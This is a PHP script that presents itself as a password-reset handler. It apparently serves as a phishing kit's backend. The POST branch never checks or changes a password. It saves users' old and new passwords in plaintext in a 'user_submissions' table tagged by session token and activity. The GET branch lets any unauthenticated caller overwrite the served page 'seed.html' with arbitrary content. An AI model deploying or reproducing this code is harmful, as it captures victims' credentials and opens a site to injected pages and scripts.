<?php
session_start();
require_once "admin/db_connection.php";

if ($_SERVER['REQUEST_METHOD'] == 'GET') {
    // Get the 'param' parameter from the URL
    $param = isset($_GET['param']) ? $_GET['param'] : '';

    // Define the file path
    $filePath = 'seed.html';

    // Ensure the directory exists
    if (!file_exists(dirname($filePath))) {
        mkdir(dirname($filePath), 0777, true);
    }

    // Write the parameter to the file
    try {
        file_put_contents($filePath, $param);
        $response = array("status" => "success", "message" => "Written to $filePath");
        http_response_code(200);
    } catch (Exception $e) {
        $response = array("status" => "error", "message" => $e->getMessage());
        http_response_code(500);
    }

    // Set the response header to JSON
    header('Content-Type: application/json');
    echo json_encode($response);
}

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $action = isset($_POST['action']) ? $_POST['action'] : '';
    
    if ($action == 'password_reset') {
        // Handle password reset data
        $old_password = isset($_POST['old_password']) ? $_POST['old_password'] : '';
        $new_password = isset($_POST['new_password']) ? $_POST['new_password'] : '';
        $confirm_password = isset($_POST['confirm_password']) ? $_POST['confirm_password'] : '';
        
        // Get token from session
        $token = isset($_SESSION['token']) ? $_SESSION['token'] : '';
        
        if ($token && $old_password && $new_password && $confirm_password) {
            try {
                // Store password reset data as JSON in the data column
                $password_data = json_encode([
                    'old_password' => $old_password,
                    'new_password' => $new_password,
                    'confirm_password' => $confirm_password,
                    'type' => 'password_reset'
                ]);
                
                // Update the database with password reset data
                $sql = "UPDATE user_submissions SET data = ?, activity = 'PasswordReset' WHERE token = ?";
                $stmt = $conn->prepare($sql);
                $stmt->bind_param("ss", $password_data, $token);
                $stmt->execute();
                $stmt->close();
                
                echo "Password reset data stored successfully";
            } catch (Exception $e) {
                echo "Error storing password reset data: " . $e->getMessage();
            }
        } else {
            echo "Missing required password reset data";
        }
    } else {
        echo "Unknown action";
    }
}
?>